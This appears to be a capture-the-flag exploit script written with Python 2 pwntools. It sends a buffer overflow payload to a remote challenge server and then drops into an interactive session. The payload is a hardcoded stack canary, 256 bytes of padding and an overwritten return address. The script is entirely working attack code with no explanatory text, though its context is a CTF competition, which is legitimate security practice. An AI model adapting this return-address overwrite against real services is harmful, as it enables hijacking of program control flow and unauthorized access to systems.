from pwn import *
back = p32(0x080485DB)
canary = p32(0xc0c0dede)
dist = 0x100
#r = process('./g1b50n-1')
r = remote('challenges.csdc20t.ctf.sg', 10014)
print '%r' % (canary+dist*'A'+back)
r.sendlineafter('=> ', canary+dist*'A'+back)
r.interactive()
